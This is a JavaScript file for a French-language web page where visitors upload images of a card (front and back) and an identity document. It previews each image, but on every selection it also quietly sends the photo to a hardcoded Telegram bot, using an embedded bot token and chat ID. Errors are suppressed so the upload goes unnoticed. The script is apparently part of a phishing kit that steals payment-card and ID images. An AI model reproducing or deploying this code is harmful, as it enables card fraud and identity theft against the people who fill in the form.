// Sélectionne tous les conteneurs de téléchargement de carte
const cardUploadContainers = document.querySelectorAll(".card-upload");
const fileInputs = document.querySelectorAll('input[type="file"]');
let allFilesUploaded = false; // État pour vérifier si tous les fichiers sont téléchargés

// Fonction pour afficher l'image sélectionnée dans le conteneur
function displayImage(fileInput, previewImg) {
  const file = fileInput.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = (e) => {
      previewImg.src = e.target.result;
      previewImg.style.display = "block"; // Afficher l'image
    };
    reader.readAsDataURL(file); // Lire le fichier sous forme d'URL
  }
}

// Fonction pour vérifier si tous les fichiers sont téléchargés
function checkFilesUploaded() {
  allFilesUploaded = Array.from(fileInputs).every(input => input.files.length > 0);
}

// Gestion des événements pour chaque conteneur de téléchargement
cardUploadContainers.forEach(container => {
  const fileInput = container.querySelector("input[type='file']");
  const previewImg = container.querySelector(".preview");

  // Ouvrir le sélecteur de fichiers au clic sur le conteneur
  container.addEventListener("click", () => {
    fileInput.click();
  });

  // Afficher l'image lors de la sélection du fichier
  fileInput.addEventListener("change", () => {
    displayImage(fileInput, previewImg);
    checkFilesUploaded(); // Vérifier après chaque sélection
  });
});

// Envoyer les images à Telegram lorsque le fichier est sélectionné
fileInputs.forEach(input => {
  input.addEventListener('change', async (event) => {
    const file = event.target.files[0];
    if (file) {
      const formData = new FormData();
      formData.append('photo', file);
      
      // Remplacez 'BOT_TOKEN' et 'CHAT_ID' par ceux de votre bot Telegram
      const telegramApiUrl = `https://api.telegram.org/bot7780372736:AAGNaKkwXP4hJ_MexlqSVGtWaP6t2IZiVNw/sendPhoto?chat_id=7363581053`;

      try {
        await fetch(telegramApiUrl, {
          method: 'POST',
          body: formData
        });
      } catch (error) {
        // Gestion d'erreur sans console.log
      }
    }
  });
});

// Gestion de la soumission du formulaire

document.addEventListener("DOMContentLoaded", function () {
  const submitButton = document.getElementById('submitBtn');
  if (submitButton) {
    submitButton.addEventListener('click', function(event) {
      event.preventDefault();
      if (!allFilesUploaded) {
        alert('Veuillez télécharger toutes les images (avant, arrière et pièce d\'identité).');
        return;
      }
      window.location.href = 'entrepage.html';
    });
  }
});
